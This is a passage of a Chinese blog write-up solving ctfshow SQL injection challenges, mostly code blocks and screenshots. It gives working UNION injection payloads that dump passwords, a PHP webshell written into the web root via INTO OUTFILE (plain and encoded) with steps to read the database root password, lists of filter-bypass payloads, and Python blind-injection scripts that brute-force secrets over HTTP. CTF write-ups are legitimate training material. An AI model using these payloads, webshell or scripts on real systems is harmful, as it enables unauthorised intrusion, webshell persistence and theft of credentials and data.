class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>koishij<span class="string">&#x27;) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814160116958.png"
                      alt="image-20220814160116958"
                ></p>
<ul>
<li><strong>字段名</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user4<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814160521291.png"
                      alt="image-20220814160521291"
                ></p>
<ul>
<li><strong>字段值</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>koishia<span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>koishib<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>koishic<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>koishid<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>koishie<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>koishif<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>koishig<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>koishih<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>koishii<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>koishij<span class="string">&#x27;) from ctfshow_user4 --+</span></span><br></pre></td></tr></table></figure></div>



<h2 id="175-webshell-outfile"><a href="#175-webshell-outfile" class="headerlink" title="175(webshell,outfile)"></a>175(webshell,outfile)</h2><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>检查结果是否有flag</span><br><span class="line">    if(<span class="operator">!</span>preg_match(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode($ret)))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>过滤了 ASCII 的0-127字符，我们可以使用盲注或者利用读写文件写入网站根目录</p>
<h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p><strong>写入一个webshell使用蚁剑连接，然后读取文件</strong></p>
<p>未处理的sql语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>php</span><br></pre></td></tr></table></figure></div>



<p><code>&lt;?php eval($_POST[1]);?&gt;</code>的base64编码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br></pre></td></tr></table></figure></div>



<p><code>PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code>的Url编码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b</span><br></pre></td></tr></table></figure></div>



<h4 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;)into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814175822042.png"
                      alt="image-20220814175822042"
                ></p>
<h4 id="蚁剑操作"><a href="#蚁剑操作" class="headerlink" title="蚁剑操作"></a>蚁剑操作</h4><p><strong>连接成功后，在&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;config.php找到mysql的root的密码</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814180235512.png"
                      alt="image-20220814180235512"
                ></p>
<p><strong>在连接处登录数据库</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814180713927.png"
                      alt="image-20220814180713927"
                ></p>
<p>在左边选择我们需要的数据库然后点击执行就行了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814180755995.png"
                      alt="image-20220814180755995"
                ></p>
<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p><strong>先盲注判断字段名</strong>（我 ctfshow 在 url 的 id 上输入sql语句没有执行，所以没做盲注脚本，这题时间盲注应该也可以）</p>
<p><strong>然后将数据输出到一个文件中，然后访问对应文件</strong></p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814181217820.png"
                      alt="image-20220814181217820"
                ></p>
<h1 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h1><h2 id="176（绕过select）"><a href="#176（绕过select）" class="headerlink" title="176（绕过select）"></a>176（绕过select）</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>万能密码都能解？</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>发现原来是过滤了select  &#x3D;。&#x3D; 随便大小写绕过就行</p>
<h2 id="177-179（绕过空格）"><a href="#177-179（绕过空格）" class="headerlink" title="177-179（绕过空格）"></a>177-179（绕过空格）</h2><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p><strong>无非就是试试：<code>/**/</code>   <code>%09</code>  <code>%0c</code> 等等之类的啦</strong></p>
<p><strong>还有些时候可以使用（）的方式绕过，详情见后续题</strong></p>
<p>从我的另一个笔记中copy过来的常用payload  ：） </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/</span><br></pre></td></tr></table></figure></div>



<h2 id="180（绕过注释符）"><a href="#180（绕过注释符）" class="headerlink" title="180（绕过注释符）"></a>180（绕过注释符）</h2><p><strong>这里它将部分空格符和注释符过滤了</strong></p>
<p><strong>绕过注释符的方法：</strong></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">or&#x27;1&#x27;=&#x27;1 </span><br><span class="line">或者</span><br><span class="line">||&#x27;1</span><br></pre></td></tr></table></figure></div>

<p>这样来闭合后面的引号</p>
<p>这题的步骤</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; order by 3 or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>									（我这里<span class="keyword">order</span> <span class="keyword">by</span>没有执行成功，不知道为啥，用下面的<span class="keyword">select</span>一个一个试也行）</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0cdatabase(),2,3%0cand&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>			（这里好像把database放在第三个会出错）</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0c1,group_concat(table_name),3%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;||&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0c1,group_concat(column_name),3%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_name=&#x27;</span>ctfshow_user<span class="string">&#x27;||&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;union%0cselecT%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>







<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a><strong>方法2</strong></h3><p><strong>也可以使用 <code>-- </code>(–后加个空格) 绕过。</strong></p>
<p><strong>payload:</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c&#x27;</span>flag<span class="string">&#x27;)%0c--%0c</span></span><br></pre></td></tr></table></figure></div>





<h2 id="180-182-完全无空格"><a href="#180-182-完全无空格" class="headerlink" title="180-182(完全无空格)"></a>180-182(完全无空格)</h2><p>这里空格被全部限制了，而且select不再区分大小写，也就是说select和空格都无法使用了（180除外）</p>
<p>根据网上的说法：</p>
<p>payload（局限性，必须后台sql语句上满足后面说到的使用原理）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></div>



<p><strong>题目已经告诉：</strong></p>
<p>sql查询代码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>过滤代码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\##|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>将我们的payload放入代码中</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where username !=<span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id = <span class="string">&#x27;&#x27;</span><span class="keyword">or</span>(id=<span class="number">26</span>)<span class="keyword">and</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span> limit <span class="number">1</span>;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure></div>

<p>因为and的优先级比or大，相当于</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(username !=<span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id = <span class="string">&#x27;&#x27;</span>)  <span class="keyword">or</span>  (id=<span class="number">26</span><span class="keyword">and</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>所以左边为0但是右边是1，所以where的条件是1，于是就去访问id&#x3D;26的元组。实际上我们做题的时候并不知道flag在哪个id中，所以我们还是得一个一个试才行</p>
<h2 id="183（from查询未禁where）"><a href="#183（from查询未禁where）" class="headerlink" title="183（from查询未禁where）"></a>183（from查询未禁where）</h2><p><strong>首先看提示需要post传参</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select count(pass) from &quot;.$_POST[<span class="string">&#x27;tableName&#x27;</span>].&quot;;</span><br></pre></td></tr></table></figure></div>

<p><strong>回显过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\##|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>查询结果</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>这里还ban掉了 <code>=</code>等号</p>
<p><strong>编写脚本注入</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://df43a7e7-0206-4b63-8744-138e17de79e9.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>







<h2 id="184（禁用where和各种引号）"><a href="#184（禁用where和各种引号）" class="headerlink" title="184（禁用where和各种引号）"></a>184（禁用where和各种引号）</h2><p><strong>查询语句</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>返回逻辑</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\##|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>查询结果</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>



<p>这里过滤了很多东西</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where、空格、甚至还有&#x27;  &quot;  ` 这仨</span><br></pre></td></tr></table></figure></div>



<h3 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h3><p><strong>用right join绕过过滤</strong></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-join-right.html" >SQL RIGHT JOIN 关键字 | 菜鸟教程 (runoob.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>RIGHT JOIN（右连接）： 用于获取右表所有记录，即使左表没有对应匹配的记录。</strong><br>例如：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> persons; </span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> position <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> b477eRy  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> p1       <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> p3       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> p4       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> persons <span class="keyword">as</span> a <span class="keyword">right</span> <span class="keyword">join</span> persons <span class="keyword">as</span> b <span class="keyword">on</span> b.position <span class="operator">=</span><span class="number">3</span>;        </span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> position <span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> position <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> b477eRy  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> p1       <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> p3       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> p4       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> p2       <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> b477eRy  <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> p1       <span class="operator">|</span> <span class="number">1</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> p3       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> p4       <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+----+----------+----------+</span></span><br><span class="line"><span class="number">9</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>

<p><strong>条件有一条记录满足时，记录总数 &#x3D; 总数 * 2 - 1</strong></p>
<p><strong>过滤 ban 了 where，可以用 right&#x2F;left&#x2F;inner join 代替</strong></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://27cf6a1e-36ab-48ce-aac6-5ee561a157d5.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp(0x&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment">## 这里是执行正确时页面上返回的字体</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 43;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将我们的payload做成16进制的形式，来绕过关键字检查</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">has: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>((has).encode().<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span>  <span class="comment">## 这里注意表中用 regexp(&#x27;ctf&#x27;) 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span> + string.digits + string.ascii_lowercase:</span><br><span class="line">        pd = flag + c</span><br><span class="line">        <span class="built_in">print</span>(<span 